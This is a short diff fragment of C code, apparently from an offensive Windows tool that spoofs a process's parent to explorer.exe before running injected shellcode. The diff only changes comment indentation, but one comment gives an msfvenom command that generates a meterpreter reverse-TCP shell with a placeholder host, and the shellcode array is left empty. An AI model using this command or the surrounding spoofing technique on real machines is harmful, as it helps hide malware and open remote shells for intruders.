@@ -9,7 +9,7 @@ DWORD getParentProcessID() {
 
 	if (Process32First(snapshot, &process)) {
 		do {
-            //If you want to another process as parent change here
+            		//If you want to another process as parent change here
 			if (!wcscmp(process.szExeFile, L"explorer.exe"))
 				break;
 		} while (Process32Next(snapshot, &process));
@@ -21,7 +21,7 @@ DWORD getParentProcessID() {
 
 int main() {
 
-    //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
+	//Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
 	unsigned char shellCode[] = "";
 
 	STARTUPINFOEXA sInfoEX;
